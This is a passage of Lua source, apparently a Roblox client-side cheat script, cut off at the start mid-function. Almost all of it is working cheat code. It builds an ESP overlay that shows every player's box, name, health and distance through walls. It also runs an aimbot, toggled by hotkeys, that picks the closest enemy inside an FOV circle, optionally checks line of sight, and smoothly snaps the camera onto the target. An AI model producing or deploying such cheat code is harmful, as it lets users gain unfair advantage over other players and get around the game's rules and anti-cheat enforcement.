    distL.TextStrokeTransparency = 0
    distL.Text = "0m"
    distL.Parent = bill
    bucket.distL = distL

    esp[plr] = bucket
end

for _, p in ipairs(Players:GetPlayers()) do
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end)

UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.R then
        CFG.aim = not CFG.aim
        aimBtn.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
    end
    if i.KeyCode == Enum.KeyCode.F then
        CFG.espBox = not CFG.espBox
        CFG.espName = not CFG.espName
        CFG.espHP = not CFG.espHP
        CFG.espDist = not CFG.espDist
    end
end)

RunService.RenderStepped:Connect(function()
    if CFG.fovCircle then
        fovCircle.Position = UDim2.new(0, Camera.ViewportSize.X / 2, 0, Camera.ViewportSize.Y / 2)
        fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
    end

    for plr, bucket in pairs(esp) do
        if plr.Character and plr:FindFirstChild("HumanoidRootPart") then
            if bucket.bill then bucket.bill.Adornee = plr.Character end
            if bucket.box then bucket.box.Adornee = plr.Character; bucket.box.Visible = CFG.espBox end
            if bucket.nameL then bucket.nameL.Visible = CFG.espName end
            if bucket.hpL then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                bucket.hpL.Text = hum and tostring(math.floor(hum.Health)) or "0"
                bucket.hpL.Visible = CFG.espHP
            end
            if bucket.distL then
                local d = (Camera.CFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                bucket.distL.Text = string.format("%dm", math.floor(d))
                bucket.distL.Visible = CFG.espDist
            end
        end
    end

    if not CFG.aim then return end

    local camPos = Camera.CFrame.Position
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local closest, dist = nil, CFG.fov

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                if not (CFG.team and p.Team and LP.Team and p.Team == LP.Team) then
                    local part = p.Character:FindFirstChild(CFG.bone) or p.Character:FindFirstChild("Head")
                    if part then
                        local scr, onScreen = Camera:WorldToViewportPoint(part.Position)
                        if onScreen then
                            local d = (Vector2.new(scr.X, scr.Y) - center).Magnitude
                            if d < dist then
                                if CFG.vis then
                                    local ray = Ray.new(camPos, (part.Position - camPos))
                                    local hit = workspace:FindPartOnRayWithIgnoreList(ray, { LP.Character, p.Character })
                                    if not hit then dist = d; closest = p end
                                else
                                    dist = d; closest = p
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    if closest and closest.Character then
        local part = closest.Character:FindFirstChild(CFG.bone) or closest.Character:FindFirstChild("Head")
        if part then
            local goal = CFrame.new(camPos, part.Position)
            Camera.CFrame = Camera.CFrame:Lerp(goal, 1 - CFG.smooth)
        end
    end
end)
